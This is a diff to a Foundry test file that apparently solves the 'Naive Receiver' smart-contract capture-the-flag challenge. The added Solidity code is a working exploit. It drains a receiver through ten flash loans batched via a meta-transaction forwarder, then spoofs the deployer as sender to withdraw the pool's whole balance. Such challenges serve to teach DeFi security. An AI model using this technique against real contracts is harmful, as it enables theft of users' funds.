@@ -80,12 +80,11 @@ contract NaiveReceiverChallenge is Test {
         bytes[] memory data = new bytes[](10);
         for (uint256 i = 0; i < 10; i++) {
             data[i] = abi.encodeWithSelector(
-                FlashLoanReceiver.onFlashLoan.selector,
-                address(pool),
+                NaiveReceiverPool.flashLoan.selector,
+                address(receiver),
                 address(weth),
                 WETH_IN_RECEIVER,
-                1 ether,
-                deployer // data
+                bytes("")
             );
         }
         BasicForwarder.Request memory request = BasicForwarder.Request({
@@ -97,9 +96,37 @@ contract NaiveReceiverChallenge is Test {
             data: abi.encodeWithSelector(Multicall.multicall.selector, data),
             deadline: block.timestamp + 1 days
         });
-        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, forwarder.getDataHash(request));
+        bytes32 digest = keccak256(
+            abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request))
+        );
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
         bytes memory signature = abi.encodePacked(r, s, v);
         forwarder.execute(request, signature);
+
+        // Draining the pool
+        bytes[] memory data2 = new bytes[](1);
+        data2[0] = abi.encodeWithSelector(
+                NaiveReceiverPool.withdraw.selector,
+                weth.balanceOf(address(pool)),
+                address(recovery),
+                abi.encode(deployer)
+            );
+        
+        BasicForwarder.Request memory request2 = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: 1_000_000,
+            nonce: forwarder.nonces(player),
+            data: abi.encodeWithSelector(Multicall.multicall.selector, data2),
+            deadline: block.timestamp + 1 days
+        });
+        bytes32 digest2 = keccak256(
+            abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request2))
+        );
+        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(playerPk, digest2);
+        bytes memory signature2 = abi.encodePacked(r2, s2, v2);
+        forwarder.execute(request2, signature2);
     }
 
     /**
